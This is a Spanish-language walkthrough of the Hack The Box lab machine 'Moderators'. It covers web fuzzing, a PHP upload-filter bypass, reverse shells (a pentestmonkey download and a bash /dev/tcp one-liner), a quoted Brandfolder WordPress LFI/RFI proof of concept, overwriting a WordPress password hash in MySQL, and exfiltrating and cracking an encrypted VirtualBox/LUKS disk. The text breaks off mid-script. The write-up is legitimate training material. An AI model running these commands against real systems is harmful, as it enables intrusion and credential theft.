---
layout: post
title: Moderators
date: 2023-02-03
description:
img:
fig-caption:
tags: [eWPT, eWPTXv2, OSWE]
---
___

<center><img src="/writeups/assets/img/Moderators-htb/Moderators_banner.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Enumeración Web

* Information Disclosure

* Bypass de Restricciones (Subida de archivo PHP)

* Port Forwarding

* Abuso de servicio web interno

* Cambio de contraseña de Wordpress a través de MySQL

* Enumeración de Imagen de VirtualBox

* Cracking disco Virtualbox

* Preparación de la máquina para que este operativa

* Intento de montura en la máquina (Fallido - No credenciales)

* Cracking Luks

* Montura en local de disco luks

* Information Disclosure (Password)

* Abuso de Privilegios Sudoers (Escalada de Privilegios)



***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.173 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-03 10:11 GMT
Nmap scan report for 10.10.11.173
Host is up (0.044s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 12.71 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p22,80 10.10.11.173 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-03 10:11 GMT
Nmap scan report for 10.10.11.173
Host is up (0.12s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 390316061130a0b0c2917988d3931b3e (RSA)
|   256 51945c593bbdbcb6267aef837f4cca7d (ECDSA)
|_  256 a56d03fa6cf5b94aa2a1b6bdbc604231 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Moderators
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.31 seconds
```

## Puerto 80 (HTTP)

Con whatweb, analizo las tecnologías que está empleando el servidor web

```null
whatweb http://10.10.11.173
http://10.10.11.173 [200 OK] Apache[2.4.41], Bootstrap[3.3.7], Country[RESERVED][ZZ], Frame, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.173], JQuery[3.2.1], Script, Title[Moderators]
```

La página principal tiene el siguiente aspecto

<img src="/writeups/assets/img/Moderators-htb/1.png" alt="">

Aplico fuzzing con Gobuster para encontrar rutas y directorios, pero no encuentro nada de interés

```null
gobuster dir -u http://10.10.11.173 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30 -x php
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.173
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/02/03 10:15:52 Starting gobuster in directory enumeration mode
===============================================================
/blog.php             (Status: 200) [Size: 13163]
/images               (Status: 301) [Size: 313] [--> http://10.10.11.173/images/]
/reports.php          (Status: 302) [Size: 7888] [--> index.php]
/index.php            (Status: 200) [Size: 11150]
/contact.php          (Status: 200) [Size: 10084]
/about.php            (Status: 200) [Size: 11539]
/service.php          (Status: 200) [Size: 9411]
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.173/css/]
/logs                 (Status: 301) [Size: 311] [--> http://10.10.11.173/logs/]
/.php                 (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
/send_mail.php        (Status: 302) [Size: 0] [--> /contact.php?msg=Email sent]
```

En el código fuente hay una función comentada

<img src="/writeups/assets/img/Moderators-htb/2.png" alt="">

En la sección de reportes, se está apuntando a cada recurso con un número identifidador

<img src="/writeups/assets/img/Moderators-htb/3.png" alt="">

Con wfuzz, aplico fuerza bruta y filtro solo por aquellos recursos que tengan contenido

```null
wfuzz -c -t 200 --hh=7888 -z range,1-100000 "http://10.10.11.173/reports.php?report=FUZZ"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.173/reports.php?report=FUZZ
Total requests: 100000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000002589:   200        274 L    523 W      9786 Ch     "2589"                                                                                                                                          
000003478:   200        275 L    526 W      9831 Ch     "3478"                                                                                                                                          
000004221:   200        273 L    523 W      9880 Ch     "4221"                                                                                                                                          
000007612:   200        275 L    523 W      9790 Ch     "7612"                                                                                                                                          
000008121:   200        273 L    522 W      9784 Ch     "8121"                                                                                                                                          
000009798:   200        276 L    525 W      9887 Ch     "9798"                                                                                                                                          

Total time: 0
Processed Requests: 100000
Filtered Requests: 99994
Requests/sec.: 0
```

En la sección de servicios, indican que los reportes se han de subir en formato PDF

<img src="/writeups/assets/img/Moderators-htb/4.png" alt="">

Para todos los IDs que ha descubierto wfuzz, tramito una petición GET para ver su contenido

```null
for id in 2589 3478 4221 7612 8121 9798; do echo -e "\n[+] ID"; curl -s -X GET "http://10.10.11.173/reports.php?report=$id" | html2text; done
```

En uno de ellos se puede ver una ruta dentro de /logs

```null
Report #9798
# Disclosure Information [+] Domain : bethebest101.uk.htb
[+] Vulnerability : Sensitive Information Disclosure
[+] Impact : 3.5/4.0
[+] Disclosed by : Karlos Young
[+] Disclosed on : 11/19/2021
[+] Posted on :
[+] Approved :
[+] Patched : NO
[+] LOGS : logs/e21cece511f43a5cb18d4932429915ed/
```

Existe, pero no tiene contenido visible

```null
curl -s -X GET "http://10.10.11.173/logs/e21cece511f43a5cb18d4932429915ed/"
curl -s -X GET "http://10.10.11.173/logs/e21cece511f43a5cb18d4932429915ed/" -I | grep HTTP
HTTP/1.1 200 OK
```

Parece MD5, así que intento romperlo

```null
john -w:/usr/share/wordlists/rockyou.txt hash --format=Raw-MD5
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
9798             (?)     
1g 0:00:00:00 DONE (2023-02-03 10:39) 1.724g/s 19906Kp/s 19906Kc/s 19906KC/s 97Gecko37..9797656
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 
```

Su valor coincide con el número de reporte. Aplico fuerza bruta en esa ruta, con la extensión PDF, porque todos los reportes están en este formato, según había visto

```null
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt "http://10.10.11.173/logs/e21cece511f43a5cb18d4932429915ed/FUZZ.pdf"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.173/logs/e21cece511f43a5cb18d4932429915ed/FUZZ.pdf
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
=====================================================================

000002257:   200        219 L    906 W      9717 Ch     "logs"  
```

<img src="/writeups/assets/img/Moderators-htb/5.png" alt="">

Como tengo varios identificadores válidos, puedo intentar crear un hash MD5 y descargarme los PDFs, con el fin de encontrar información privilegiada

```null
for id in 2589 3478 4221 7612 8121 9798; do echo -n $id | md5sum | awk '{print $1}'; done
743c41a921516b04afde48bb48e28ce6
b071cfa81605a94ad80cfa2bbc747448
74d90aafda34e6060f9e8433962d14fd
ce5d75028d92047a9ec617acb9c34ce6
afecc60f82be41c1b52f6705ec69e0f1
e21cece511f43a5cb18d4932429915ed
```

Solo uno tiene contenido de interés


<img src="/writeups/assets/img/Moderators-htb/6.png" alt="">

Abro esa nueva ruta para ver si existe

<img src="/writeups/assets/img/Moderators-htb/7.png" alt="">

Tengo un formulario de subida de archivos. Dentro de /logs hay un directorio /uploads, al que tengo acceso

```null
gobuster dir -u http://10.10.11.173/logs -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.173/logs
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Timeout:                 10s
===============================================================
2023/02/03 10:55:32 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 319] [--> http://10.10.11.173/logs/uploads/]
```

Intento subir un script en PHP, pero de primeras está restringido

<img src="/writeups/assets/img/Moderators-htb/8.png" alt="">

Intercepto la petición con BurpSuite y le modifico los magic numbers, el nombre para que contenga la extensión PDF y el Content-Type

<img src="/writeups/assets/img/Moderators-htb/9.png" alt="">

A la hora de ejecutar comandos, no los interpreta. También probé a enviarme una traza ICMP para asegurarme de que el problema no era la representación

<img src="/writeups/assets/img/Moderators-htb/10.png" alt="">

Modifico el script para que contenga una función más simple, como un echo

```null
%PDF-1.5 %âãÏÓ

<?php
  echo "Testing";
?>
```

<img src="/writeups/assets/img/Moderators-htb/11.png" alt="">

Teniendo esto en consideración, puedo tratar de subir un código obfuscado para así ejecutar comandos. Miro el PHPinfo para encontrar las funciones bloqueadas

<img src="/writeups/assets/img/Moderators-htb/12.png" alt="">

<img src="/writeups/assets/img/Moderators-htb/13.png" alt="">

Me descargo una función que me automatice la reverse shell en PHP, modificando la IP y el puerto hacia donde va dirijida y la subo al servidor

```null
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
```

Gano acceso al sistema como www-data

```null
nc -nlvp 443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.11.173.
Ncat: Connection from 10.10.11.173:38738.
Linux moderators 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 11:31:00 up  1:26,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

Para no estar desde una sh, me envío otra por bash

```null
$ bash -c 'bash -i >& /dev/tcp/10.10.14.7/443 0>&1' & disown
```

```null
nc -nlvp 443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.11.173.
Ncat: Connection from 10.10.11.173:38762.
bash: cannot set terminal process group (1000): Inappropriate ioctl for device
bash: no job control in this shell
www-data@moderators:/$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@moderators:/$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
www-data@moderators:/$ export TERM=xterm
www-data@moderators:/$ export SHELL=bash
```

# Escalada

En el directorio /opt hay un WordPress montado cuyo propietario es lexi y como grupo asignado está moderators

```null
www-data@moderators:/opt/site.new$ ls -la
total 228
drwxr-xr-x  5 lexi moderators  4096 Jul 14  2022 .
drwxr-xr-x  3 root root        4096 Jul 14  2022 ..
-rw-r--r--  1 lexi moderators   405 Sep 11  2021 index.php
-rw-r--r--  1 lexi moderators 19915 Jan 29  2022 license.txt
-rw-r--r--  1 lexi moderators  7437 Jan 29  2022 readme.html

...
```

El puerto 8080 está abierto internamente

```null
www-data@moderators:/opt/site.new$ netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        2      0 127.0.0.1:8080          0.0.0.0:*               LISTEN 
```

Me lo traigo a mi equipo por SOCKS5 con chisel

Primero creo el servidor

```null
chisel server -p 1234 --reverse
```

Desde la máquina víctima me conecto

```null
www-data@moderators:/dev/shm$ ./chisel client 10.10.14.7:1234 R:socks &>/dev/null & disown
```

Se está aplicando Virtual Hosting, así que añado el dominio moderators.htb apuntando al localhost y en el navegador, añado un proxy en el addon FoxyProxy

<img src="/writeups/assets/img/Moderators-htb/14.png" alt="">

Así carga correctamente

<img src="/writeups/assets/img/Moderators-htb/15.png" alt="">

Como ya estoy dentro de la máquina víctima, puedo ver directamente los plugins que están instalados y ahorrarme la fuerza bruta

```null
www-data@moderators:/opt/site.new/wp-content/plugins$ ls
brandfolder  index.php	passwords-manager
```

Encuentro un LFI

```null
searchsploit brandfolder
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                 |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin Brandfolder 3.0 - Local/Remote File Inclusion                                                                                                                 | php/webapps/39591.txt
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

En el exploit explican en que consiste

```null
$_REQUEST is based on the user input, so as you can guess,
an attacker can depending on the context, host on a malicious server
a file called wp-load.php, and disable its execution using an htaccess, or
abuse the null byte character ( %00, %2500 url-encoded)

II-Proof of concept
http://localhost/wp/wp-content/plugins/brandfolder/callback.php?wp_abspath=LFI/RFI
http://localhost/wp/wp-content/plugins/brandfolder/callback.php?wp_abspath=../../../wp-config.php%00
http://localhost/wp/wp-content/plugins/brandfolder/callback.php?wp_abspath=http://evil/
```

En el directorio /uploads, creo un script que se llame wp-load.php y lo llamo abusando del LFI, pudiendo así ejecutar comandos

```null
www-data@moderators:/var/www/html/logs/uploads$ cat wp-load.php 
<?php
  system("whoami");
?>
www-data@moderators:/var/www/html/logs/uploads$ curl -s -X GET "http://localhost:8080/wp-content/plugins/brandfolder/callback.php?wp_abspath=/var/www/html/logs/uploads/"
lexi
```

Me envío una reverse shell y gano acceso como este usuario

```null
nc -nlvp 443
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.11.173.
Ncat: Connection from 10.10.11.173:40634.
bash: cannot set terminal process group (832): Inappropriate ioctl for device
bash: no job control in this shell
lexi@moderators:/opt/site.new/wp-content/plugins/brandfolder$ script /dev/null -c bash
<ntent/plugins/brandfolder$ script /dev/null -c bash          
Script started, file is /dev/null
lexi@moderators:/opt/site.new/wp-content/plugins/brandfolder$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
<ew/wp-content/plugins/brandfolder$ export TERM=xterm                        
lexi@moderators:/opt/site.new/wp-content/plugins/brandfolder$ export SHELL=bash
ns 209oderators:/opt/site.new/wp-content/plugins/brandfolder$ stty rows 56 colum 
lexi@moderators:/opt/site.new/wp-content/plugins/brandfolder$ 
```

Puedo ver la primera flag

```null
lexi@moderators:~$ cat user.txt 
933a184acac3c6eccd16d914830798c5
```

Ahora puedo ver el contenido de los archivos del WordPress. Dentro de wp-config.php hay credenciales de acceso a la base de datos

```null
/** MySQL database username */
define( 'DB_USER', 'wordpressuser' );

/** MySQL database password */
define( 'DB_PASSWORD', 'wordpresspassword123!!' );
```

En la base de datos hay credenciales hasheadas

```null
MariaDB [wordpress]> select user_email,user_pass from wp_users;
+----------------------+------------------------------------+
| user_email           | user_pass                          |
+----------------------+------------------------------------+
| admin@moderators.htb | $P$BXasOiM52pOUIRntJTPVlMoH0ZlntT0 |
| lexi@moderators.htb  | $P$BZ0Fj92qgnvg4F52r3lpwHejcXag461 |
+----------------------+------------------------------------+
```

Para no tener que crackearla que puede que incluso no llegue a la contraseña en texto claro, puedo cambiarsela directamente, ya que estoy como el usuario lexi que es el que corre el servidor web

Utilizo una herramienta online para general el hash

<img src="/writeups/assets/img/Moderators-htb/16.png" alt="">

Se la cambio al usuario admin

```null
MariaDB [wordpress]> UPDATE `wp_users` SET `user_pass` = '$P$BbFxEF1rl30B/RboQFmBXdjmt97cZh1' WHERE user_login = 'admin';
Query OK, 1 row affected (0.003 sec)
Rows matched: 1  Changed: 1  Warnings: 0
```

Entro en el Wordpress con la contraseña que he definido

<img src="/writeups/assets/img/Moderators-htb/17.png" alt="">

Hay una sección con contraseñas

<img src="/writeups/assets/img/Moderators-htb/18.png" alt="">

Está almacenada la id_rsa del usuario john

<img src="/writeups/assets/img/Moderators-htb/19.png" alt="">

Almaceno la id_rsa, le asigno el privilegio 600 y me conecto como este usuario

```null
ssh john@10.10.11.173 -i id_rsa
john@moderators:~$
```

Dentro del directorio stuff hay un directorio de VirtualBox, con una máquina virtual

```null
john@moderators:~/stuff$ ls
exp  VBOX
john@moderators:~/stuff$ cd VBOX/
john@moderators:~/stuff/VBOX$ ls
2019-08-01.vbox  2019.vdi
```

En el archivo de configuración, se puede ver que el disco está cifrado

```null
          <Property name="CRYPT/KeyId" value="Moderator 1"/>
          <Property name="CRYPT/KeyStore" value="U0NORQABQUVTLVhUUzI1Ni1QTEFJTjY0AAAAAAAAAAAAAAAAAABQQktERjItU0hB&#13;&#10;MjU2AAAAAAAAAAAAAAAAAAAAAAAAAEAAAABUQgV7yASjqRRgfezqVXSqcDjNzg1J&#13;&#10;jH/ENK/ozVskTyAAAADpYIvN2MBwhohZoxyfHl5d6YterYwh8lwMQ+5peBbjLCBO&#13;&#10;AABUYpGmB0lDsJbqgNsq451Bed5tHD8X6iXWLmJ6v6f7y2A9CABAAAAAo4alQy6T&#13;&#10;jyDI+8mvRgp4wXkMGavRxR6cC+ckk5yUgVhhgPxKNBNdhIHkNtjBMrj0uaVQ3ksk&#13;&#10;gwC6MrGLZFhl1g=="/>
```

Me transfiero los archivos a mi equipo

En la máquina víctima
```null
john@moderators:~/stuff/VBOX$ nc 10.10.14.7 443 < 2019-08-01.vbox 

En mi máquina

```null
nc -nlvp 443 > 2019-08-01.vbox
nc -nlvp 443 > 2019.vd1
```

Para poder importarla en VirtualBox, hay que cambiar la etiqueta donde se indica la ruta donde se encuentra el disco.

```null
<HardDisk uuid="{12b147da-5b2d-471f-9e32-a32b1517ff4b}" location="/home/rubbx/Desktop/HTB/Machines/Moderators/2019.vdi" format="VDI" type="Normal">
```

Añado la máquina a VirtualBox

<img src="/writeups/assets/img/Moderators-htb/20.png" alt="">

Aparecerá un error, y no lo puedo solucionar. Creo que es porque la máquina está encriptada, pero el VirtualBox no lo reconoce, ya que esa opción está desactiva y para habilitarla necesito saber la contraseña que por ahora no la tengo

<img src="/writeups/assets/img/Moderators-htb/21.png" alt="">

Para poder desencriptar el disco, necesito pasarle el UUID al tool de VirtualBox

```null
VBoxManage encryptmedium
Usage:

VBoxManage encryptmedium    <uuid|filename>
                            [--newpassword <file>|-]
                            [--oldpassword <file>|-]
                            [--cipher <cipher identifier>]
                            [--newpasswordid <password identifier>]
```

Lo puedo extraer del archivo de configuración

```null
cat 2019-08-01.vbox | grep -i uuid
  <Machine uuid="{528b3540-b8be-4677-b43f-7f4969137747}" name="Moderator 1" OSType="Ubuntu_64" snapshotFolder="Snapshots" lastStateChange="2021-09-15T16:44:57Z">
        <HardDisk uuid="{12b147da-5b2d-471f-9e32-a32b1517ff4b}" location="2019.vdi" format="VDI" type="Normal">
        <Image uuid="{7653d755-c513-4004-8891-be83fc130dba}" location="F:/ubuntu-22.04-desktop-amd64.iso"/>
        <SmbiosUuidLittleEndian enabled="true"/>
          <Image uuid="{12b147da-5b2d-471f-9e32-a32b1517ff4b}"/>

```

Como también necesito la contraseña, creo un hash para poder romperlo por fuerza bruta. Utilizo un script en python que se encarga de generarlo

```null
wget https://gitcode.net/mirrors/hashcat/hashcat/-/raw/master/tools/virtualbox2hashcat.py

python3 virtualbox2hashcat.py --vbox 2019-08-01.vbox
$vbox$0$540000$546291a6074943b096ea80db2ae39d4179de6d1c3f17ea25d62e627abfa7fbcb$16$a386a5432e938f20c8fbc9af460a78c1790c19abd1c51e9c0be724939c9481586180fc4a34135d8481e436d8c132b8f4b9a550de4b248300ba32b18b645865d6$20000$e9608bcdd8c070868859a31c9f1e5e5de98b5ead8c21f25c0c43ee697816e32c$5442057bc804a3a914607decea5574aa7038cdce0d498c7fc434afe8cd5b244f
```

En mi máquina host tengo los drivers CUDA instalados, así que crackeo desde allí

<img src="/writeups/assets/img/Moderators-htb/22.png" alt="">

Desde el Kali también se puede y no tarda tanto

```null
hashcat hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz, 3494/7053 MB (1024 MB allocatable), 4MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

27600 | VirtualBox (PBKDF2-HMAC-SHA256 & AES-256-XTS) | Full-Disk Encryption (FDE)

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP
* (null)

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

Cracking performance lower than expected?                 

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$vbox$0$540000$546291a6074943b096ea80db2ae39d4179de6d1c3f17ea25d62e627abfa7fbcb$16$a386a5432e938f20c8fbc9af460a78c1790c19abd1c51e9c0be724939c9481586180fc4a34135d8481e436d8c132b8f4b9a550de4b248300ba32b18b645865d6$20000$e9608bcdd8c070868859a31c9f1e5e5de98b5ead8c21f25c0c43ee697816e32c$5442057bc804a3a914607decea5574aa7038cdce0d498c7fc434afe8cd5b244f:computer
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 27600 (VirtualBox (PBKDF2-HMAC-SHA256 & AES-256-XTS))
Hash.Target......: $vbox$0$540000$546291a6074943b096ea80db2ae39d4179de...5b244f
Time.Started.....: Fri Feb  3 14:05:14 2023 (15 secs)
Time.Estimated...: Fri Feb  3 14:05:29 2023 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       18 H/s (14.17ms) @ Accel:64 Loops:512 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 256/14344385 (0.00%)
Rejected.........: 0/256 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:19968-19999
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> freedom
Hardware.Mon.#1..: Util: 85%

Started: Fri Feb  3 14:04:08 2023
Stopped: Fri Feb  3 14:05:30 2023
```

Convierto una imagen ISO de ubuntu a formato VDI

```null
VBoxManage convertfromraw ubuntu-22.04.1-live-server-amd64.iso ubuntu-22.04.1-live-server-amd64.vdi
Converting from raw image file="ubuntu-22.04.1-live-server-amd64.iso" to file="ubuntu-22.04.1-live-server-amd64.vdi"...
Creating dynamic image with size 1474873344 bytes (1407MB).

mv ubuntu-22.04.1-live-server-amd64.vdi Ubuntu.vdi
```

Si intento ejecutar de nuevo la máquina, me aparece un error y eso es porque hay que cambiar el UUID de la nueva imagen en el archivo de configuración y el ubuntu server no tiene versión de prueba, así que descargo una de escritorio

<img src="/writeups/assets/img/Moderators-htb/23.png" alt="">

```null
VBoxManage convertfromraw ubuntu-22.04.1-desktop-amd64.iso --uuid ab3423f1-b7c3-459e-975a-5dc8211ec5f1 Ubuntu.vdi
Converting from raw image file="ubuntu-22.04.1-desktop-amd64.iso" to file="Ubuntu.vdi"...
Creating dynamic image with size 3826831360 bytes (3650MB)...
```

Una vez arranca correctamente la máquina virtual, le introduzco la contraseña de antes

<img src="/writeups/assets/img/Moderators-htb/24.png" alt="">

En la versión de prueba, sin instalar nada, puedo ver varios discos lógicos

<img src="/writeups/assets/img/Moderators-htb/25.png" alt="">

Pero al tratar de montarlo no me reconoce el sistema de ficheros

<img src="/writeups/assets/img/Moderators-htb/26.png" alt="">

Al intentar descifrarlo me pide una contraseña, y no sirve la de antes

<img src="/writeups/assets/img/Moderators-htb/27.png" alt="">

Con los tools de VirtualBox, hago un decrypt del disco, con idea de crear una montura en mi equipo

```null
VBoxManage encryptmedium "{12b147da-5b2d-471f-9e32-a32b1517ff4b}" --oldpassword -
Enter old password:
0%...10%...20%...30%...40%...50%...60%...70%...80%...90%...100%
```

En este [artículo](https://askubuntu.com/questions/19430/mount-a-virtualbox-drive-image-vdi) explican todo paso a paso

```null
sudo apt install qemu-block-extra
sudo rmmod nbd
sudo modprobe nbd max_part=16
sudo qemu-nbd -c /dev/nbd0 2019.vdi
mkdir /tmp/root
```

Empiezan los errores, que es el mismo problema que tuve desde la máquina Ubuntu

```null
sudo mount /dev/nbd0 /tmp/root
mount: /tmp/root: unknown filesystem type 'crypto_LUKS'.
       dmesg(1) may have more information after failed mount system call.
```

Así que al final si que voy a tener que crackear el passphrase.

Me descargo una herramienta que lo automatiza

```null
wget https://github.com/Diverto/cryptsetup-pwguess/releases/download/v1.0.0/bruteforce-luks-static-linux-amd64
chmod +x bruteforce-luks-static-linux-amd64
./bruteforce-luks-static-linux-amd64 -f /usr/share/wordlists/rockyou.txt /dev/nbd0
Warning: using dictionary mode, ignoring options -b, -e, -l, -m and -s.

Tried passwords: 9
Tried passwords per second: 0.333333
Last tried password: abc123

Password found: abc123
```

El crackeo es muy lento, pero al final encuentra la contraseña, está en la novena línea

Ahora cambio un poco la forma de la montura

```null
sudo apt-get install cryptsetup

sudo cryptsetup luksOpen /dev/nbd0 pwned
Enter passphrase for /dev/nbd0: 
```

Esto crea un enlace simbólico que hace accesible a la montura sin proporcionar la contraseña

```null
ls -l /dev/mapper
crw------- root root 0 B Fri Feb  3 15:54:06 2023  control
lrwxrwxrwx root root 7 B Fri Feb  3 15:54:15 2023  pwned ⇒ ../dm-0
```

Creo la montura y me desplazo

```null
mount /dev/mapper/pwned /tmp/root
```

Dentro hay muchos scripts, principalmente de bash. Si filtro por la cadena pass, encuentro una cadena que llama la atención

```null
ind . -name \*.sh | xargs cat | grep -i pass
        proxy_pass http://unix:/home/$username/public_html/$username.sock;
    echo -e "\n\nJenkins installation is complete.\nAccess the Jenkins interface from http://$local_ip:8080\nThe default password is located at '/var/lib/jenkins/secrets/initialAdminPassword'\n\nExiting..."
        proxy_pass http://unix:/home/$username/public_html/$username.sock;
    echo -e "\n\n######################\n   Enter the password for the Nagios Admin - 'nagiosadmin'\n######################\n\n"
    htpasswd -c /usr/local/nagios/etc/htpasswd.users nagiosadmin
    echo -e "\nInstallation Complete..\nLogin using the URL: http://$ipaddr/nagios\nUsername:nagiosadmin\nPassword:<set up earlier>"
# Script to generate random passwords using openssl                   #
# Usage: ./passgen.sh <number of passwords> <length of passwords>     #
pass_num=$1
[ -n "$pass_num" ] || pass_num=1
pass_len=$2
[ -n "$pass_len" ] || pass_len=16
for i in $(seq 1 $pass_num);
      openssl rand -base64 48 | cut -c1-${pass_len};
    PASSWORD=password$i
    sudo adduser --quiet --disabled-password --gecos "" $USERNAME
    echo "$USERNAME:$PASSWORD" | sudo chpasswd
sudo mount -t cifs //$STORAGE_NAME.file.core.windows.net/$FILESHARE_NAME $MOUNT_POINT -o vers=3.0,username=$STORAGE_NAME,password=$STORAGE_KEY,dir_mode=0777,file_mode=0777
//$STORAGE_NAME.file.core.windows.net/$FILESHARE_NAME $MOUNT_POINT cifs vers=3.0,username=$STORAGE_NAME,password=$STORAGE_KEY,dir_mode=0777,file_mode=0777
passwd='$_THE_best_Sysadmin_Ever_'
    echo "Enter password for Jupyter notebook"
    python -c "import IPython;print(IPython.lib.passwd())" > SHA1_FILE
        sed -i "s|#c.NotebookApp.password = ''|c.NotebookApp.password = '$SHA1'|" $JUPYTER_CONF
```

Pertence a este script

```null
#!/bin/bash
#
# This script configure some global options in git like aliases, credential helper,
# user name and email. Tested in Ubuntu and Mac.
#
# Method of use:
# source git_configure.sh
#

echo ""
echo "Installing updates.."
passwd='$_THE_best_Sysadmin_Ever_'
echo $paswd|sudo apt-get update

echo "Uprgading..."
